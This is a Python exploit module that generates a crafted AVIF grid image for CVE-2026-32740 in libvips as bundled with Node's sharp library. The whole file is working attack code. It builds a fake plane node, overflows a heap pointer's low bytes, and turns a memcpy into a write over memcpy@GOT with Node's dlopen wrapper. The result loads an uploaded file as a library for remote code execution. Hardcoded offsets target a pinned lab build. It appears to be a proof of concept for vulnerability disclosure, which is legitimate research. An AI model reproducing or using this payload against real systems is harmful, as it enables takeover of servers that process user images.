#!/usr/bin/env python3
"""Generate the proven CVE-2026-32740 memcpy-GOT payload.

This module intentionally contains only the chain used by the final remote
PoC.  Earlier BSS, vtable and rb-tree-GOT experiments are not part of the
published exploit.
"""

from __future__ import annotations

import struct

from avif_grid import build_grid_avif


TILE_WIDTH = 116
TILE_HEIGHT = 33
CHROMA_WIDTH = (TILE_WIDTH + 1) // 2
CHROMA_HEIGHT = (TILE_HEIGHT + 1) // 2
CANVAS_CHROMA_HEIGHT = (TILE_HEIGHT * 4 + 1) // 2
CANVAS_STRIDE = 64

# Pinned lab build: Node v25.8.1 ET_EXEC and bundled libvips 8.17.2.
NODE_UNIX_DLOPEN = 0x1FB95B0
LIBVIPS_MEMCPY_GOT = 0xF83098

# In the measured stock sharp worker layout the fourth tile's local chroma
# row 1 is at low16 0x5970.  The overflow changes only the low two bytes of
# the live pointer, retaining the remotely unknown high 48 bits.
FAKE_NODE_LOW16 = 0x5970
FAKE_NODE_LOCAL_ROW = 1


def _fake_plane_node(write_target: int) -> bytes:
    node = bytearray(96)
    struct.pack_into("<Q", node, 16, 0)  # left: terminate map search
    struct.pack_into("<Q", node, 24, 0)  # right: unused before GOT trigger
    struct.pack_into("<I", node, 32, 2)  # heif_channel_Cr
    struct.pack_into("<I", node, 40, 0)  # unsigned integer datatype
    node[44] = 8
    node[45] = 1
    struct.pack_into(
        "<II", node, 48, CHROMA_WIDTH, CANVAS_CHROMA_HEIGHT,
    )
    struct.pack_into("<Q", node, 64, write_target)
    struct.pack_into("<I", node, 88, 0)  # destination stride: every row same
    return bytes(node)


def build_rce_payload(libvips_base: int,
                      library_path: str = "uploads/x.jpg") -> bytes:
    """Build one runtime-specific AVIF from the remotely leaked DSO base."""
    encoded_path = library_path.encode("ascii") + b"\x00"
    if len(encoded_path) > 16:
        raise ValueError(
            "library_path must fit in 15 ASCII bytes plus the NUL terminator",
        )
    if libvips_base & 0xFFF:
        raise ValueError("libvips base is not page-aligned")

    # The first chosen-address memcpy starts 16 bytes before memcpy@GOT.  Its
    # source row contains the path followed at +16 by unixDlOpen, replacing
    # the GOT slot.  The next row calls the replacement with RSI pointing to
    # the same path prefix.
    write_target = libvips_base + LIBVIPS_MEMCPY_GOT - 16
    row = encoded_path.ljust(16, b"\x00")
    row += struct.pack("<Q", NODE_UNIX_DLOPEN)
    row += bytes(CHROMA_WIDTH - len(row))
    write_data = row * CHROMA_HEIGHT
    node = _fake_plane_node(write_target)
    root_chunk_header = struct.pack("<QQ", 0, 0x75)
    selected_low16 = struct.pack("<H", FAKE_NODE_LOW16)

    def cb_value(x: int, y: int) -> int:
        relative = (y - FAKE_NODE_LOCAL_ROW) * CANVAS_STRIDE + x
        if 0 <= relative < len(node):
            return node[relative]
        if y != CHROMA_HEIGHT - 1:
            return 0
        if x < 16:
            return 0
        if x < 32:
            return root_chunk_header[x - 16]
        if x < 56:
            return 0
        return selected_low16[x - 56]

    def cr_value(x: int, y: int) -> int:
        return write_data[y * CHROMA_WIDTH + x]

    return build_grid_avif(
        tile_w=TILE_WIDTH,
        tile_h=TILE_HEIGHT,
        rows=4,
        cols=1,
        canvas_w=TILE_WIDTH,
        canvas_h=TILE_HEIGHT * 4,
        luma=0x80,
        cb=cb_value,
        cr=cr_value,
        quiet=True,
    )
